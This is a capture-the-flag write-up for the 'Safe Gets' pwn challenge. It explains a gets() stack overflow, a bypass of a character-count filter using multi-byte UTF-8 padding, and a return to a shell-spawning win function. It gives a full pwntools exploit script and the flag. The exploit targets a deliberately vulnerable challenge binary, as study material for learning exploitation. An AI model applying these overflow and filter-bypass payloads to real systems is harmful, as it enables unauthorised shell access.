---
title: Safe Gets
date: 2025-07-14T21:42:41+03:00
description: Writeup for Safe Gets [L3akCTF_2025s]
author: vikcoc
tags:
- pwn
draft: false
---
___

## Challenge Description

I think I found a way to make gets safe.

## Intuition

If we take a look at it with Ghidra
```asm
        004011a5 48 8d 85        LEA        RAX=>local_118,[RBP + -0x110]
                 f0 fe ff ff
        004011ac 48 89 c7        MOV        RDI,RAX
        004011af b8 00 00        MOV        EAX,0x0
                 00 00
        004011b4 e8 e7 fe        CALL       FUN_004010a0                                     undefined FUN_004010a0()
                 ff ff
```
Where `FUN_004010a0` is just `gets`, we are given the entry point for a ROP exploit.\
A close look at other functions packaged in the executable also shows our destination.
```C
void win(void)

{
  system("/bin/sh");
  return;
}
```

## Solution

If we take a look at the protections enabled on the binary:
```bash
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
We see that no leak is needed, as the code is not Position Independent.\
The challenge comes from the wrapper that filters our inputs.
```python
MAX_LEN = 0xff

# Get input from user
payload = input(f"Enter your input (max {MAX_LEN} bytes): ")
# print(payload)
if len(payload) > MAX_LEN:
    print("[-] Input too long!")
    sys.exit(1)
```
If the first line is longer than `0xff` characters it gets denied, but the overflow requres around `0x110` bytes.\
A hint to help us bypass this limitation is given further down.
```python
        proc.stdin.write(line.encode('latin1'))
        proc.stdin.flush()
```
This has something to do with encoding.\
For UTF-8[^1] we learn that a character can be multiple bytes long, for example `অ` is 3 bytes long. Therefore sending the next line generates enough bytes for an overflow while remaining within the character count.
```python
pwin = 0x401262
paywin1 = b'/bin/sh'[::-1] + b'\0' + 'অ'.encode() * 0x5A + b'aa' + pwn.p64(pwin)
target.sendlineafter(b'(max 255 bytes)', paywin1)
```
Now we get a stack not aligned error.\
No problem, we can jump back to main to align the stack. But doing that raises an error in the wrapper, that it cannot decode the input to utf-8.\
The Wikipedia article on UTF-8[^1] gives us information to make sense of that:
- 1 byte characters are of the form `0yyyzzzz`
- 2 byte characters are of the form `110xxxyy` `10yyzzzz`
- 3 byte characters are of the form `1110wwww` `10xxxxyy` `10yyzzzz`
- 4 byte characters are of the form `11110uvv` `10vvwwww` `10xxxxyy` `10yyzzzz`

In the address of main we have byte `0x96`. It is `10010110`, a valid encoding for at least the second byte in a UTF-8 character.\
Luckily for us, we are dealing with a little endian architecture, and `0x96` is the last byte in the address. That makes `0x96` the first byte that is not padding. This means that we can choose a byte of the form `110xxxyy` for the last padding byte, for example `0xC2`. It and our problem byte together form a valid character.

```python
pmain = 0x401196
paymain1 = b'/bin/sh'[::-1] + b'\0' + 'অ'.encode() * 0x5A + b'a\xC2' + pwn.p64(pmain)
print(target.sendlineafter(b'(max 255 bytes)', paymain1).decode())
```
Another thing to note is that for the rest of the lines the wrapper encodes to `latin1`, and it removes the size limit, which necessitates another small adjustment.\
For a full exploit we would have:
```python
import pwn
pwn.context.terminal = ['konsole', '-e']

target = pwn.remote('34.45.81.67', 16002)

pmain = 0x401196
pwin = 0x401262

paymain1 = b'/bin/sh'[::-1] + b'\0' + 'অ'.encode() * 0x5A + b'a\xC2' + pwn.p64(pmain)
print(target.sendlineafter(b'(max 255 bytes)', paymain1).decode())

paywin2 = b'/bin/sh'[::-1] + b'\0' + b'b' * 0x10E + b'aa' + pwn.p64(pwin)
print(target.sendlineafter(b'/bin/sh', paywin2, timeout=2).decode())

target.interactive()
```
After that we get a shell and take the flag.

### Flag

`L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}`

## References

[^1]: https://en.wikipedia.org/wiki/UTF-8#Description
